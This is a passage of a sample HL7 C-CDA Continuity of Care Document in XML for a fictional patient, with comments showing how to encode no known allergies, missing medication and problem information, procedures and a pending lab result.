 $LastChangedDate: 2014-11-12 23:25:09 -0500 (Wed, 12 Nov 2014) $
  
 ********************************************************
 Disclaimer: This sample file contains representative data elements to represent a Continuity of Care Document (CCD). 
 The file depicts a fictional character's health data. Any resemblance to a real person is coincidental. 
 To illustrate as many data elements as possible, the clinical scenario may not be plausible. 
 The data in this sample file is not intended to represent real patients, people or clinical events. 
 This sample is designed to be used in conjunction with the C-CDA Clinical Notes Implementation Guide.
 ********************************************************
 -->
<!-- This CCD_2 illustrates how to represent "no known", "no information", and "pending" in some sections.
	In addition it provides several other sectional data (e.g. Vital Signs) different than other sample CCD -->
<ClinicalDocument xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="urn:hl7-org:v3" xmlns:voc="urn:hl7-org:v3/voc" xmlns:sdtc="urn:hl7-org:sdtc">
	<!-- ** CDA Header ** -->
	<realmCode code="US"/>
	<typeId extension="POCD_HD000040" root="2.16.840.1.113883.1.3"/>
	<!-- CCD document template within C-CDA 2.0-->
	<templateId root="2.16.840.1.113883.10.20.22.1.2" extension="2014-06-09"/>
	<!-- Globally unique identifier for the document. Can only be [1..1] -->
	<id extension="EHRVersion2.0" root="be84a8e4-a22e-4210-a4a6-b3c48273e84c"/>
	<code code="34133-9" displayName="Summary of episode note" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
	<!-- Title of this document -->
	<title>Summary of Patient Chart</title>
	<!-- This is the time of document generation -->
	<effectiveTime value="20141015103026-0500"/>
	<confidentialityCode code="N" displayName="normal" codeSystem="2.16.840.1.113883.5.25" codeSystemName="Confidentiality"/>
	<!-- This is the document language code which uses internet standard RFC 4646. This often differs from patient language within recordTarget -->
	<languageCode code="en-US"/>
	<setId extension="sTT988" root="2.16.840.1.113883.19.5.99999.19"/>
	<!-- Version of this document -->
	<versionNumber value="1"/>
	<recordTarget>
		<patientRole>
			<!-- The id would likely be the patient's medical record number. This root identifies Partners Healthcare as an example -->
			<id extension="98765432" root="1.3.6.1.4.1.16517.1"/>
			<!-- Additional ids can capture other MRNs or identifiers, such as social security number shown below -->
			<id extension="12345679" root="2.16.840.1.113883.4.1"/>
			<!-- HP is "primary home" from valueSet 2.16.840.1.113883.1.11.10637 -->
			<addr use="HP">
				<!-- You can have multiple [1..4] streetAddressLine elements. Single shown below -->
				<streetAddressLine>4567 Residence Rd</streetAddressLine>
				<city>Beaverton</city>
				<!-- 5 or 9 digit zip codes from valueSet 2.16.840.1.113883.3.88.12.80.2-->
				<!-- PostalCode is required if the country is US. If country is not specified, it's assumed to be US. If country 
					is something other than US, the postalCode MAY be present but MAY be bound to different vocabularies -->
				<postalCode>97867</postalCode>
				<!-- State is required if the country is US. If country is not specified, it's assumed to be US. 
					If country is something other than US, the state MAY be present but MAY be bound to different vocabularies -->
				<!-- OR is "Oregon" from valueSet 2.16.840.1.113883.3.88.12.80.1 -->
				<state>OR</state>
				<!-- US is "United States" from valueSet 2.16.840.1.113883.3.88.12.80.63 -->
				<country>US</country>
			</addr>
			<!-- MC is "mobile contact" from HL7 AddressUse 2.16.840.1.113883.5.1119 -->
			<telecom value="tel:+1(444)444-4444" use="MC"/>
			<!-- Multiple telecoms are possible -->
			<telecom value="mailto:Isbella.Jones.CCD@gmail.com"/>
			<patient>
				<name use="L">
					<given>Isabella</given>
					<family qualifier="SP">Jones</family>
				</name>
				<administrativeGenderCode code="F" displayName="Female" codeSystem="2.16.840.1.113883.5.1" codeSystemName="AdministrativeGender"/>
				<!-- Date of birth need only be precise to the day -->
				<birthTime value="19501219"/>
				<maritalStatusCode code="M" displayName="Married" codeSystem="2.16.840.1.113883.5.2" codeSystemName="MaritalStatusCode"/>
				<religiousAffiliationCode code="1013" displayName="Christian (non-Catholic, non-specific)" codeSystem="2.16.840.1.113883.5.1076" codeSystemName="HL7 Religious Affiliation"/>
				<!-- CDC Race and Ethnicity code set contains the five minimum race and ethnicity categories defined by OMB Standards -->
				<raceCode code="2106-3" displayName="White" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<!-- The raceCode extension is only used if raceCode is valued -->
				<sdtc:raceCode code="2114-7" displayName="Italian" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<ethnicGroupCode code="2186-5" displayName="Not Hispanic or Latino" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
				<guardian>
					<code code="POWATT" displayName="Power of Attorney" codeSystem="2.16.840.1.113883.1.11.19830" codeSystemName="ResponsibleParty"/>
					<addr use="HP">
						<streetAddressLine>4567 Residence Rd</streetAddressLine>
						<city>Beaverton</city>
						<state>OR</state>
						<postalCode>97867</postalCode>
						<country>US</country>
					</addr>
					<telecom value="tel:+1(444)444-4444" use="MC"/>
					<guardianPerson>
						<name>
							<given>Boris</given>
							<given qualifier="CL">Bo</given>
							<family>Jones</family>
						</name>
					</guardianPerson>
				</guardian>
				<birthplace>
					<place>
						<addr>
							<streetAddressLine>4444 Home Street</streetAddressLine>
							<city>Beaverton</city>
							<state>OR</state>
							<postalCode>97867</postalCode>
							<country>US</country>
						</addr>
					</place>
				</birthplace>
				<languageCommunication>
					<languageCode code="ita"/>
					<!-- "ita" is ISO 639-2 alpha-3 code for "Italian" -->
					<modeCode code="ESP" displayName="Expressed spoken" codeSystem="2.16.840.1.113883.5.60" codeSystemName="LanguageAbilityMode"/>
					<proficiencyLevelCode code="G" displayName="Good" codeSystem="2.16.840.1.113883.5.61" codeSystemName="LanguageAbilityProficiency"/>
					<!-- Patient's preferred language -->
					<preferenceInd value="true"/>
				</languageCommunication>
				<languageCommunication>
					<languageCode code="eng"/>
					<!-- "eng" is ISO 639-2 alpha-3 code for "English" -->
					<modeCode code="ESP" displayName="Expressed spoken" codeSystem="2.16.840.1.113883.5.60" codeSystemName="LanguageAbilityMode"/>
					<proficiencyLevelCode code="P" displayName="Poor" codeSystem="2.16.840.1.113883.5.61" codeSystemName="LanguageAbilityProficiency"/>
					<!-- Patient's preferred language -->
					<preferenceInd value="false"/>
				</languageCommunication>
			</patient>
			<providerOrganization>
				<id extension="219BX" root="1.1.1.1.1.1.1.1.2"/>
				<name>The Doctors Together Physician Group</name>
				<telecom use="WP" value="tel: +1(555)555-5000"/>
				<addr>
					<streetAddressLine>1007 Health Drive</streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>99123</postalCode>
					<country>US</country>
				</addr>
			</providerOrganization>
		</patientRole>
	</recordTarget>
	<!-- The author represents the person who provides the content in the document -->
	<author>
		<time value="20141015103026-0500"/>
		<assignedAuthor>
			<id extension="5555555555" root="2.16.840.1.113883.4.6"/>
			<code code="207QA0505X" displayName="Allopathic &amp; Osteopathic Physicians; Family Medicine, Adult Medicine" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
			<addr>
				<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1004"/>
			<assignedPerson>
				<name>
					<given>Patricia</given>
					<given qualifier="CL">Patty</given>
					<family>Primary</family>
					<suffix qualifier="AC">M.D.</suffix>
				</name>
			</assignedPerson>
		</assignedAuthor>
	</author>
	<!-- While not required, a second author may be appropriate to represent EHR software used-->
	<author>
		<time value="20141015103026-0500"/>
		<assignedAuthor>
			<id nullFlavor="NI"/>
			<addr>
				<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1004"/>
			<assignedAuthoringDevice>
				<manufacturerModelName>Generic EHR Clinical System 2.0.0.0.0.0</manufacturerModelName>
				<softwareName>Generic EHR C-CDA Factory 2.0.0.0.0.0 - C-CDA Transform 2.0.0.0.0</softwareName>
			</assignedAuthoringDevice>
			<representedOrganization>
				<id extension="3" root="1.3.6.1.4.1.22812.3.99930.3"/>
				<name>The Doctors Together Physician Group</name>
				<telecom value="tel:+1(555)555-1004"/>
				<addr>
					<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>99123</postalCode>
					<country>US</country>
				</addr>
			</representedOrganization>
		</assignedAuthor>
	</author>
	<!-- The dataEnterer transferred the content created by the author into the document -->
	<dataEnterer>
		<assignedEntity>
			<id extension="333777777" root="2.16.840.1.113883.4.6"/>
			<addr>
				<streetAddressLine>1007 Healthcare Drive</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1050"/>
			<assignedPerson>
				<name>
					<given>Ellen</given>
					<family>Enter</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</dataEnterer>
	<!-- The informant represents any sources of information for document content -->
	<informant>
		<assignedEntity>
			<id extension="333444444" root="1.1.1.1.1.1.1.4"/>
			<addr>
				<streetAddressLine>1017 Health Drive</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1017"/>
			<assignedPerson>
				<name>
					<given>William</given>
					<given qualifier="CL">Bill</given>
					<family>Beaker</family>
				</name>
			</assignedPerson>
			<representedOrganization>
				<name>Good Health Laboratory</name>
			</representedOrganization>
		</assignedEntity>
	</informant>
	<informant>
		<relatedEntity classCode="PRS">
			<!-- classCode "PRS" represents a person with personal relationship with the patient -->
			<code code="SPS" displayName="SPOUSE" codeSystem="2.16.840.1.113883.1.11.19563" codeSystemName="Personal Relationship Role Type Value Set"/>
			<relatedPerson>
				<name>
					<given>Boris</given>
					<given qualifier="CL">Bo</given>
					<family>Jones</family>
				</name>
			</relatedPerson>
		</relatedEntity>
	</informant>
	<!-- The custodian represents the organization charged with maintaining the original source document -->
	<custodian>
		<assignedCustodian>
			<representedCustodianOrganization>
				<id extension="321CX" root="1.1.1.1.1.1.1.1.3"/>
				<name>Good Health HIE</name>
				<telecom use="WP" value="tel:+1(555)555-1009"/>
				<addr use="WP">
					<streetAddressLine>1009 Healthcare Drive </streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>99123</postalCode>
					<country>US</country>
				</addr>
			</representedCustodianOrganization>
		</assignedCustodian>
	</custodian>
	<!-- The informationRecipient represents the intended recipient of the document -->
	<informationRecipient>
		<intendedRecipient>
			<informationRecipient>
				<name>
					<given>Sara</given>
					<family>Specialize</family>
					<suffix qualifier="AC">M.D.</suffix>
				</name>
			</informationRecipient>
			<receivedOrganization>
				<name>The DoctorsApart Physician Group</name>
			</receivedOrganization>
		</intendedRecipient>
	</informationRecipient>
	<!-- The legalAuthenticator represents the individual who is responsible for the document -->
	<legalAuthenticator>
		<time value="20141015103026-0500"/>
		<signatureCode code="S"/>
		<assignedEntity>
			<id extension="5555555555" root="2.16.840.1.113883.4.6"/>
			<code code="207QA0505X" displayName="Allopathic &amp; Osteopathic Physicians; Family Medicine, Adult Medicine" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
			<addr>
				<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1004"/>
			<assignedPerson>
				<name>
					<given>Patricia</given>
					<given qualifier="CL">Patty</given>
					<family>Primary</family>
					<suffix qualifier="AC">M.D.</suffix>
				</name>
			</assignedPerson>
		</assignedEntity>
	</legalAuthenticator>
	<!-- The authenticator represents the individual attesting to the accuracy of information in the document-->
	<authenticator>
		<time value="20141015103026-0500"/>
		<signatureCode code="S"/>
		<assignedEntity>
			<id extension="5555555555" root="2.16.840.1.113883.4.6"/>
			<code code="207QA0505X" displayName="Allopathic &amp; Osteopathic Physicians; Family Medicine, Adult Medicine" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
			<addr>
				<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>99123</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)555-1004"/>
			<assignedPerson>
				<name>
					<given>Patricia</given>
					<given qualifier="CL">Patty</given>
					<family>Primary</family>
					<suffix qualifier="AC">M.D.</suffix>
				</name>
			</assignedPerson>
		</assignedEntity>
	</authenticator>
	<!-- The participant represents supporting entities -->
	<participant typeCode="IND">
		<!-- typeCode "IND" represents an individual -->
		<associatedEntity classCode="NOK">
			<!-- classCode "NOK" represents the patient's next of kin-->
			<addr use="HP">
				<streetAddressLine>2222 Home Street</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97867</postalCode>
				<country>US</country>
			</addr>
			<telecom value="tel:+1(555)555-2008" use="MC"/>
			<associatedPerson>
				<name>
					<given>Boris</given>
					<given qualifier="CL">Bo</given>
					<family>Jones</family>
				</name>
			</associatedPerson>
		</associatedEntity>
	</participant>
	<!-- Entities playing multiple roles are recorded in multiple participants -->
	<participant typeCode="IND">
		<associatedEntity classCode="ECON">
			<!-- classCode "ECON" represents an emergency contact -->
			<addr use="HP">
				<streetAddressLine>2222 Home Street</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97867</postalCode>
				<country>US</country>
			</addr>
			<telecom value="tel:+1(555)555-2008" use="MC"/>
			<associatedPerson>
				<name>
					<given>Boris</given>
					<given qualifier="CL">Bo</given>
					<family>Jones</family>
				</name>
			</associatedPerson>
		</associatedEntity>
	</participant>
	<documentationOf>
		<serviceEvent classCode="PCPR">
			<!-- The effectiveTime reflects the provision of care summarized in the document. 
				In this scenario, the provision of care summarized is date when patient first seen -->
			<effectiveTime>
				<low value="20141001"/>
				<!-- The low value represents when the summarized provision of care began. 
					In this scenario, the patient's first visit -->
				<high value="20141015103026-0500"/>
				<!-- The high value represents when the summarized provision of care being ended. 
					In this scenario, when chart summary was created -->
			</effectiveTime>
			<performer typeCode="PRF">
				<functionCode code="PCP" displayName="primary care physician" codeSystem="2.16.840.1.113883.5.88" codeSystemName="Participation Function">
					<originalText>Primary Care Provider</originalText>
				</functionCode>
				<assignedEntity>
					<id extension="5555555555" root="2.16.840.1.113883.4.6"/>
					<code code="207QA0505X" displayName="Allopathic &amp; Osteopathic Physicians; Family Medicine, Adult Medicine" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
					<addr>
						<streetAddressLine>1004 Healthcare Drive </streetAddressLine>
						<city>Portland</city>
						<state>OR</state>
						<postalCode>99123</postalCode>
						<country>US</country>
					</addr>
					<telecom use="WP" value="tel:+1(555)555-1004"/>
					<assignedPerson>
						<name>
							<given>Patricia</given>
							<given qualifier="CL">Patty</given>
							<family>Primary</family>
							<suffix qualifier="AC">M.D.</suffix>
						</name>
					</assignedPerson>
					<representedOrganization>
						<id extension="219BX" root="1.1.1.1.1.1.1.1.2"/>
						<name>The DoctorsTogether Physician Group</name>
						<telecom use="WP" value="tel: +1(555)555-5000"/>
						<addr>
							<streetAddressLine>1004 Health Drive</streetAddressLine>
							<city>Portland</city>
							<state>OR</state>
							<postalCode>99123</postalCode>
							<country>US</country>
						</addr>
					</representedOrganization>
				</assignedEntity>
			</performer>
		</serviceEvent>
	</documentationOf>
	<!-- ******************************************************** CDA Body ******************************************************** -->
	<component>
		<structuredBody>
			<!-- ***************** ALLERGIES *************** -->
			<component>
				<section>
					<!-- *** Allergies and Intolerances section with entries required *** -->
					<!-- This section represents the statement of "no known allergies" -->
					<!-- If you want to represent a more generalized 'no information', see null section pattern (e.g. this CCD medications and problems)-->
					<!-- If you only wanted to represent 'no known drug allergies', the observation/value@code and participant should be changed accordingly -->
					<templateId root="2.16.840.1.113883.10.20.22.2.6.1" extension="2014-06-09"/>
					<code code="48765-2" codeSystem="2.16.840.1.113883.6.1"/>
					<title>ALLERGIES AND ADVERSE REACTIONS</title>
					<text>
						<paragraph>No known allergies</paragraph>
					</text>
					<entry typeCode="DRIV">
						<!-- Allergy Concern Act -->
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.30" extension="2014-06-09"/>
							<id root="36e3e930-7b14-11db-9fe1-0800200c9a66"/>
							<!-- SDWG supports 48765-2 or CONC in the code element -->
							<code code="CONC" codeSystem="2.16.840.1.113883.5.6"/>
							<!--currently tracked concerns are active concerns-->
							<statusCode code="active"/>
							<effectiveTime>
								<!-- This equates to the time the concern was authored in the patient's chart. This may frequently be an EHR timestamp-->
								<low value="20141003103026-0500"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<!-- No Known Allergies -->
								<!-- The negationInd = true negates the observation/value -->
								<!-- The use of negationInd corresponds with the newer Observation.valueNegationInd -->
								<observation classCode="OBS" moodCode="EVN" negationInd="true">
									<!-- allergy - intolerance observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.7" extension="2014-06-09"/>
									<id root="4adc1020-7b14-11db-9fe1-0800200c9a66"/>
									<code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
									<statusCode code="completed"/>
									<!-- N/A - In this case, no biological onset is documented for the absence of allergies -->
									<effectiveTime>
										<low nullFlavor="NA"/>
									</effectiveTime>
									<!-- This code was selected to negate any allergy. For no known drug allergies, code 416098002 would be more appropriate -->
									<value xsi:type="CD" code="419199007" displayName="Allergy to substance (disorder)" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
									<author>
										<time value="20141003103026-0500"/>
										<assignedAuthor>
											<id extension="99999999" root="2.16.840.1.113883.4.6"/>
											<code code="200000000X" codeSystem="2.16.840.1.113883.6.101" displayName="Allopathic &amp; Osteopathic Physicians"/>
											<telecom use="WP" value="tel:555-555-1002"/>
											<assignedPerson>
												<name>
													<given>Henry</given>
													<family>Seven</family>
												</name>
											</assignedPerson>
										</assignedAuthor>
									</author>
									<!-- ISSUE participant is required for allergy intolerance even when negated -->
									<participant typeCode="CSM">
										<participantRole classCode="MANU">
											<playingEntity classCode="MMAT">
												<!-- ISSUE This conflicts with guidance from CDA example task force -->
												<!-- Code 410942007 would be appropriate for no known drug allergy -->
												<code code="105590001" displayName="Substance" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
											</playingEntity>
										</participantRole>
									</participant>
								</observation>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>
			<!-- **************** MEDICATIONS ***************************** -->
			<component>
				<!-- nullFlavor of NI indicates No Information.-->
				<!-- Note this pattern may not validate with schematron but has been SDWG approved -->
				<section nullFlavor="NI">
					<!-- *** Medications section with entries required *** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.1.1" extension="2014-06-09"/>
					<code code="10160-0" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="HISTORY OF MEDICATION USE"/>
					<title>MEDICATIONS</title>
					<text>
						<paragraph>No information</paragraph>
					</text>
				</section>
			</component>
			<!-- ***************** PROBLEM LIST *********************** -->
			<component>
				<!-- nullFlavor of NI indicates No Information.-->
				<!-- Note this pattern may not validate with schematron but has been SDWG approved -->
				<section nullFlavor="NI">
					<!-- conforms to Problems section with entries required -->
					<templateId root="2.16.840.1.113883.10.20.22.2.5.1" extension="2014-06-09"/>
					<code code="11450-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="PROBLEM LIST"/>
					<title>PROBLEMS</title>
					<text>No Information</text>
				</section>
			</component>
			<!-- ************** PROCEDURES ***************** -->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.7.1" extension="2014-06-09"/>
					<code code="47519-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="HISTORY OF PROCEDURES"/>
					<title>PROCEDURES</title>
					<text>
						<table>
							<thead>
								<tr>
									<th>Description</th>
									<th>Date and Time (Range)</th>
									<th>Status</th>
								</tr>
							</thead>
							<tbody>
								<tr ID="Procedure1">
									<td ID="ProcedureDesc1">Laparoscopic appendectomy</td>
									<td>03 Feb 2014 09:22am- 03 Feb 2014 11:15am</td>
									<td>Completed</td>
								</tr>
								<tr ID="Procedure2">
									<td ID="ProcedureDesc2">Electrocardiogram (12-Lead)</td>
									<td>29 Mar 2014 09:15am</td>
									<td>Completed</td>
								</tr>
								<tr ID="Procedure3">
									<td ID="ProcedureDesc3">Individual Counseling For Medical Nutrition </td>
									<td>29 Mar 2014 10:45am</td>
									<td>Completed</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<!-- Procedures should be used for care that directly changes the patient's physical state.-->
						<procedure moodCode="EVN" classCode="PROC">
							<templateId root="2.16.840.1.113883.10.20.22.4.14" extension="2014-06-09"/>
							<id root="64af26d5-88ef-4169-ba16-c6ef16a1824f"/>
							<code xsi:type="CE" code="6025007" displayName="Laparoscopic appendectomy" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED-CT">
								<originalText> Laparoscopic appendectomy<reference value="#ProcedureDesc1"/>
								</originalText>
								<translation xsi:type="CE" codeSystem="2.16.840.1.113883.6.12" codeSystemName="CPT" code="44970" displayName="Laparoscopic Appendectomy"/>
								<translation xsi:type="CE" codeSystem="2.16.840.1.113883.6.4" codeSystemName="ICD-10-PCS" code="0DTJ4ZZ" displayName="Resection of Appendix, Percutaneous Endoscopic Approach"/>
								<translation xsi:type="CE" codeSystem="2.16.840.1.113883.6.104" codeSystemName="ICD-9-CM" code="47.01" displayName="Laparoscopic appendectomy"/>
							</code>
							<text>
								<reference value="#Procedure1"/>
							</text>
							<statusCode code="completed"/>
							<!-- Effective times can be either a value or interval. For procedures with start and stop times, an interval would be more appropriate -->
							<effectiveTime xsi:type="IVL_TS">
								<low value="20141002103026-0500"/>
								<high value="20141002124245-0500"/>
							</effectiveTime>
							<!-- methodCode indicates how the procedure was performed. It cannot conflict with the code used for procedure-->
							<methodCode code="51316009" codeSystem="2.16.840.1.113883.6.96" displayName="Laparoscopic procedure" codeSystemName="SNOMED-CT"/>
							<!-- targetSiteCode indicates the body site addressed by procedure and must be from value set 2.16.840.1.113883.3.88.12.3221.8.9-->
							<targetSiteCode code="181255000" codeSystem="2.16.840.1.113883.6.96" displayName="Entire appendix" codeSystemName="SNOMED-CT"/>
							<performer>
								<assignedEntity>
									<id root="2.16.840.1.113883.19.5.9999.456" extension="2981823"/>
									<addr>
										<streetAddressLine>1001 Village Avenue</streetAddressLine>
										<city>Portland</city>
										<state>OR</state>
										<postalCode>99123</postalCode>
										<country>US</country>
									</addr>
									<telecom use="WP" value="+1(555)555-5000"/>
									<representedOrganization classCode="ORG">
										<id root="2.16.840.1.113883.19.5.9999.1393"/>
										<name>Community Health and Hospitals</name>
										<telecom use="WP" value="+1(555)555-5000"/>
										<addr>
											<streetAddressLine>1001 Village Avenue</streetAddressLine>
											<city>Portland</city>
											<state>OR</state>
											<postalCode>99123</postalCode>
											<country>US</country>
										</addr>
									</representedOrganization>
								</assignedEntity>
							</performer>
						</procedure>
					</entry>
					<entry typeCode="DRIV">
						<!-- Observations should be used for care that result in information about the patient (e.g. a diagnostic test & result) but do not alter physical state-->
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.13" extension="2014-06-09"/>
							<id root="c03e5445-af1b-4911-a419-e2782f21448c"/>
							<code xsi:type="CE" code="268400002" codeSystem="2.16.840.1.113883.6.96" displayName="12 lead electrocardiogram" codeSystemName="SNOMED-CT">
								<originalText> Electrocardiogram (12-Lead)<reference value="#ProcedureDesc2"/>
								</originalText>
								<translation xsi:type="CE" code="93000" codeSystem="2.16.840.1.113883.6.12" displayName="Electrocardiogram, complete" codeSystemName="CPT"/>
								<translation xsi:type="CE" code="G8704" codeSystem="2.16.840.1.113883.6.13" displayName="12-Lead Electrocardiogram (Ecg) Performed" codeSystemName="HCPCS"/>
								<translation xsi:type="CE" code="89.52" codeSystem="2.16.840.1.113883.6.104" displayName="Electrocardiogram" codeSystemName="ICD-9 Procedure"/>
								<translation xsi:type="CE" code="4A02X4Z" codeSystem="2.16.840.1.113883.6.4" displayName="Measurement of Cardiac Electrical Activity, External Approach" codeSystemName="ICD-10 Procedure"/>
							</code>
							<text>
								<reference value="#Procedure2"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime value="20141001103026-0500"/>
							<!-- When choosing an observation, value records relevant findings-->
							<value xsi:type="CD" code="251135002" codeSystem="2.16.840.1.113883.6.96" displayName="Borderline normal electrocardiogram" codeSystemName="SNOMED-CT"/>
							<!-- targetSiteCode indicates the body site addressed by observation and must be from value set 2.16.840.1.113883.3.88.12.3221.8.9-->
							<targetSiteCode code="302509004" codeSystem="2.16.840.1.113883.6.96" displayName="Entire heart" codeSystemName="SNOMED-CT"/>
							<performer>
								<assignedEntity>
									<id root="2.16.840.1.113883.19.5.9999.456" extension="2981823"/>
									<addr>
										<streetAddressLine>1001 Village Avenue</streetAddressLine>
										<city>Portland</city>
										<state>OR</state>
										<postalCode>99123</postalCode>
										<country>US</country>
									</addr>
									<telecom use="WP" value="+1(555)555-5000"/>
									<representedOrganization classCode="ORG">
										<id root="2.16.840.1.113883.19.5.9999.1393"/>
										<name>Community Health and Hospitals</name>
										<telecom use="WP" value="+1(555)555-5000"/>
										<addr>
											<streetAddressLine>1001 Village Avenue</streetAddressLine>
											<city>Portland</city>
											<state>OR</state>
											<postalCode>99123</postalCode>
											<country>US</country>
										</addr>
									</representedOrganization>
								</assignedEntity>
							</performer>
						</observation>
					</entry>
					<entry typeCode="DRIV">
						<!-- Act should be used for care of the patient that cannot be classified as a procedure or observation (e.g. wound dressing change, counseling) -->
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.12" extension="2014-06-09"/>
							<id root="9c0f070c-2e9e-4be1-a5b5-ff6d0f68123c"/>
							<code xsi:type="CE" code="61310001" codeSystem="2.16.840.1.113883.6.96" displayName="Nutrition education" codeSystemName="SNOMED-CT">
								<originalText> Individual Counseling For Medical Nutrition<reference value="#ProcedureDesc3"/>
								</originalText>
								<translation xsi:type="CE" code="97802" codeSystem="2.16.840.1.113883.6.12" displayName="Medical nutrition therapy; initial assessment and intervention, individual, face-to-face with the patient, each 15 minutes" codeSystemName="CPT"/>
								<translation xsi:type="CE" code="S9470" codeSystem="2.16.840.1.113883.6.13" displayName="Nutritional counseling, diet" codeSystemName="HCPCS"/>
								<!-- For some activities, ICD-9 and ICD-10 procedure codes may not apply (e.g. nutritional counseling). ICD-9 and ICD-10 diagnosis codes translate and shown below-->
								<translation xsi:type="CE" code="V65.3" codeSystem="2.16.840.1.113883.6.103" displayName="Dietary surveillance and counseling" codeSystemName="ICD-9 Diagnosis"/>
								<translation xsi:type="CE" code="Z71.3" codeSystem="2.16.840.1.113883.6.90" displayName="Dietary counseling and surveillance" codeSystemName="ICD-10 Diagnosis"/>
							</code>
							<text>
								<reference value="#Procedure3"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime value="20141001143221-0500"/>
							<performer>
								<assignedEntity>
									<id root="2.16.840.1.113883.19.5.9999.456" extension="2981823"/>
									<addr>
										<streetAddressLine>1001 Village Avenue</streetAddressLine>
										<city>Portland</city>
										<state>OR</state>
										<postalCode>99123</postalCode>
										<country>US</country>
									</addr>
									<telecom use="WP" value="+1(555)555-5000"/>
									<representedOrganization classCode="ORG">
										<id root="2.16.840.1.113883.19.5.9999.1393"/>
										<name>Community Health and Hospitals</name>
										<telecom use="WP" value="+1(555)555-5000"/>
										<addr>
											<streetAddressLine>1001 Village Avenue</streetAddressLine>
											<city>Portland</city>
											<state>OR</state>
											<postalCode>99123</postalCode>
											<country>US</country>
										</addr>
									</representedOrganization>
								</assignedEntity>
							</performer>
						</act>
					</entry>
				</section>
			</component>
			<!-- ******************** RESULTS ************************ -->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.3.1" extension="2014-06-09"/>
					<code code="30954-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="RESULTS"/>
					<title>RESULTS</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Name</th>
									<th>Actual Result</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>CBC with Ordered Manual Differential panel - Blood</td>
									<td/>
									<td>8/6/2012</td>
								</tr>
								<tr>
									<td>
										<content ID="result5">Leukocytes [#/​volume] in Blood by Manual count [LOINC: 804-5]</content>
									</td>
									<!-- Representation of the pending test in the narrative section -->
									<td>Pending</td>
									<td>8/6/2012 11:45am</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<organizer classCode="BATTERY" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.1" extension="2014-06-09"/>
							<id root="7d5a02b0-67a4-11db-bd13-0800200c9a66"/>
							<code xsi:type="CE" code="57782-5" displayName="CBC with Ordered Manual Differential panel - Blood" codeSystemName="LOINC" codeSystem="2.16.840.1.113883.6.1"/>
							<!-- Status is active since all components are not complete -->
							<statusCode code="active"/>
							<!-- This is one component of several that would typically in in CBC. Single result to illustrate pending information -->
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.2" extension="2014-06-09"/>
									<id root="68762391-bfa5-4dfa-9f6f-d37109a97d19"/>
									<code xsi:type="CE" code="804-5" displayName="Leukocytes [#/​volume] in Blood by Manual count" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
